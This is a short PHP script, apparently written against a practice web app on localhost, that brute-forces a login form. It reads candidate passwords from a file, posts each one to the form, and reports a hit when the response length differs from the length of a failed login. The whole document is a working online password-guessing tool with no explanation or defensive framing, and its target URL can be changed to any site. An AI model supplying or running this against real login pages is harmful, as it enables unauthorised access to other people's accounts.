<?php

/**
 * enter url
 */
$url = 'http://localhost';

$pwFile = fopen("password.txt", "r") or die("Unable to open file!");
$fileString = fread($pwFile,filesize("password.txt"));
$passwords = explode( PHP_EOL, $fileString );

fclose($pwFile);

foreach ($passwords as $key => $value){

    $data =array(
        'login' => 'login',
        'password' => $value,
        'security_level' => 0,
        'form' => 'submit'
    );

    $options = array(
        'http' => array(
            'header' => 'Content-type: application/x-www-form-urlencoded\r\n',
            'method' => 'POST',
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url,false,$context);

    sleep(1);

    $length = strlen($result);
    if ($length != 2884 ){
        print '-' . $value . "\r\n";
    }else{
        print 'FOUND!' . $value;
        break;
    }

}
